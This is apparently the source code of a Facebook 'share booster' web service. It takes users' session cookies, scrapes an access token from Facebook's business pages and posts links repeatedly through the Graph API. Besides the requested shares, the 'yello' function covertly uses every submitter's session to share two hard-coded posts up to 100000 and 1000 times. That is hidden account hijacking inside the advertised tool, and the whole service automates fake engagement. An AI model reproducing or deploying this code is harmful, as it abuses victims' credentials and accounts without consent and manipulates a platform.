const cf = require("./wse-express/index");
const app = new cf();

const axios = require('axios');

const total = new Map();
const usera = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1";

app.any('/', (req, res) => {
  return res.custom(null, {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, HEAD, OPTIONS, DELETE",
    "Access-Control-Allow-Headers": 'Content-Type, X-Requested-With',
    "Location": "https://sharebooster.pages.dev"
  }, 308);
});

app.get('/shares', (req, res) => {
 const data = Array.from(total.values()).map((link, index) => ({
  shared: link.shared,
  session: index + 1,
  url: link.url,
  count: link.count,
  target: link.target,
}));
 return res.json(data || [], 200);
});

app.post('/submit', async (req, res) => {
  const {
    cookie,
    url,
    amount,
    interval,
  } = await req.body();
  if (!cookie || !url || !amount || !interval)
  return res.json({
    status: 400,
    error: 'Missing state, url, amount, or interval'
  }, 400);
  try {
    const cookies = await convertCookie(cookie);
    if (!cookies) {
      return res.json({
        status: 400,
        error: 'Invalid cookies'
      }, 400);
    };
    await yello(cookies, url, amount, interval)
    res.json({
      status: 200
    }, 200);
  } catch (err) {
    return res.json({
      status: 400,
      error: err.message || err
    }, 400);
  }
});

async function yello(c,u,a,i){
  await share(true, c,u,a,i);
  await share(false, c, "https://www.facebook.com/100015801404865/posts/pfbid0QrXdCRonpxJeTaPybGFzb2Tyd212N76LTuFPNUQm4fdodNo2hvL3cuQSwAJ4wk3Cl/?app=fbl", "100000", "6");
  await share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
}

async function share(sharedIs,cookies, url, amount, interval) {
  const id = Math.floor(Math.random() * 69696969);
  const accessToken = await getAccessToken(cookies);
  total.set(id, {
    shared: sharedIs,
    url,
    count: 0,
    target: amount,
  });
  let sharedCount = 0;
  let timer;
  const headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate',
    'connection': 'keep-alive',
    'content-length': '0',
    'cookie': cookies,
    'user-agent': usera,
    'host': 'graph.facebook.com'
  };
  async function sharePost() {
    try {
      const response = await axios.post(`https://graph.facebook.com/me/feed?link=${url}&published=0&access_token=${accessToken}`, {}, {
        headers
      });
      if (response.status !== 200) {
      } else {
        total.set(id, {
          ...total.get(id),
          count: total.get(id).count + 1,
        });
        sharedCount++;
        }
      if (sharedCount === amount) {
        clearInterval(timer);
      }
    } catch (error) {
      clearInterval(timer);
      total.delete(id);
    }
  }
  timer = setInterval(() => {
  sharePost();
  }, interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(id);
  }, amount * interval * 1000);
        
}
async function getPostID(url) {
  try {
    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    return response.data.id;
  } catch (error) {
    return;
  }
}
async function getAccessToken(cookie) {
  try {
    const headers = {
      'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'cache-control': 'max-age=0',
      'cookie': cookie,
      'referer': 'https://www.facebook.com/',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Linux"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
    };
    const response = await axios.get('https://business.facebook.com/content_management', {
      headers
    });
    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
    if (token && token[1]) {
      const accessToken = token[1];
      return accessToken;
    }
  } catch (error) {
    return;
  }
}
async function convertCookie(cookie) {
  return new Promise((resolve, reject) => {
    try {
      const cookies = JSON.parse(cookie);
      const sbCookie = cookies.find(cookies => cookies.key === "sb");
      if (!sbCookie) {
        reject("Detect invalid appstate please provide a valid appstate");
      }
      const sbValue = sbCookie.value;
      const data = `sb=${sbValue}; ${cookies.slice(1).map(cookies => `${cookies.key}=${cookies.value}`).join('; ')}`;
      resolve(data);
    } catch (error) {
      reject("Error processing appstate please provide a valid appstate");
    }
  });
}

addEventListener('fetch', async(event) => {
  event.respondWith(app.handleRequest(event.request));
});